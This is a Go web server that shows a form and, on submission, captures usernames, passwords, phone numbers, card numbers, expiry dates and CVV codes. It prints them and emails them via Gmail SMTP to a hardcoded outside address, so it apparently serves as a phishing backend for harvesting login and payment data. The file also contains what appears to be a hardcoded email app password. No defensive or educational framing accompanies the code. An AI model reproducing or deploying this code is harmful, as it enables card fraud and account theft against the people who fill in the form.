package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"net/smtp"
	"os"
	"text/template"
)

type Page struct {
	Body []byte
}

const port = ":8080"

func customNotFound404(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusNotFound)
	p := Page{Body: []byte("")}
	renderTemplate(w, "404", p)
}

func projectHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" && r.URL.Path != "/send" {
		customNotFound404(w, r)
		return
	}

	if r.Method == http.MethodPost {
		username := r.FormValue("username")
		password := r.FormValue("password")
		phone := r.FormValue("phone")
		card := r.FormValue("card")
		expiry := r.FormValue("expiry")
		cvv := r.FormValue("cvv")
		fmt.Println("Nom d'utilisateur:", username)
		fmt.Println("Mot de passe:", password)
		fmt.Println("Numéro de téléphone:", phone)
		fmt.Println("Numéro de carte:", card)
		fmt.Println("Date d'expiration:", expiry)
		fmt.Println("CVV:", cvv)

		// Sender data.
		from := "charlespresseauu@gmail.com"
		passwordmail := "jssdwttdxyucarle"

		// Receiver email address.
		to := []string{
			"michellelavins@gmail.com",
		}

		// smtp server configuration.
		smtpHost := "smtp.gmail.com"
		smtpPort := "587"

		// Authentication.
		auth := smtp.PlainAuth("", from, passwordmail, smtpHost)

		t, _ := template.ParseFiles("template.html")

		var body bytes.Buffer

		mimeHeaders := "MIME-version: 1.0;\nContent-Type: text/html; charset=\"UTF-8\";\n\n"
		body.Write([]byte(fmt.Sprintf("Subject: Your paiement \n%s\n\n", mimeHeaders)))

		t.Execute(&body, struct {
			Username   string
			Password   string
			Phone      string
			CardNumber string
			Expiration string
			Securite   string
		}{
			Username:   username,
			Password:   password,
			Phone:      phone,
			CardNumber: card,
			Expiration: expiry,
			Securite:   cvv,
		})

		// Sending email.
		err := smtp.SendMail(smtpHost+":"+smtpPort, auth, from, to, body.Bytes())
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("Email Sent!")

	}
	if r.Method == http.MethodGet {
		p := Page{Body: []byte("")}
		renderTemplate(w, "formulaire", p)
	}

}

var templates = template.Must(template.ParseGlob("*.html"))

func renderTemplate(w http.ResponseWriter, tmpl string, p Page) {
	err := templates.ExecuteTemplate(w, tmpl+".html", p)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func main() {
	arguments := os.Args
	if len(arguments) > 1 {
		fmt.Println("This program doesn't take arguments.")
		return
	}
	fs := http.FileServer(http.Dir("."))

	http.HandleFunc("/", projectHandler)
	http.HandleFunc("/send", projectHandler)
	http.HandleFunc("/style.css", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "style.css")
	})
	http.Handle("/static/", http.StripPrefix("/static/", fs))

	fmt.Println("Server started and running on", port)
	fmt.Println("http://localhost" + port)
	log.Fatal(http.ListenAndServe(port, nil))
}
